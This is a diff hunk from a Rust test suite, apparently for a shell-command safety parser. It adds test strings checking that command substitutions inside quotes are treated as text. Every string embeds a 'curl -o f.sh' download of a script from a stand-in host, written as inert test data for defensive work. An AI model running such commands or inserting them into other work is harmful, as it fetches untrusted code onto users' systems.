@@ -1543,6 +1543,8 @@ fn a_substitution_in_a_quote_is_text_unless_a_shell_is_given_it() {
         "msg 'a (b) $(curl -o f.sh https://x.example/f.sh)'",
         "echo 'trap `curl -o f.sh https://x.example/f.sh`'",
         "echo 'the trap $(curl -o f.sh https://x.example/f.sh) is set'",
+        "echo \"never use \\`eval\\` with \\`curl -o f.sh https://x.example/f.sh\\`\"",
+        "echo \"no \\$(eval x) here\" 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "gcc -c \"$src\" 'f$(curl -o f.sh https://x.example/f.sh)'",
         "tar -xc 'f$(curl -o f.sh https://x.example/f.sh)'",
         "wc -c 'f$(curl -o f.sh https://x.example/f.sh)'",
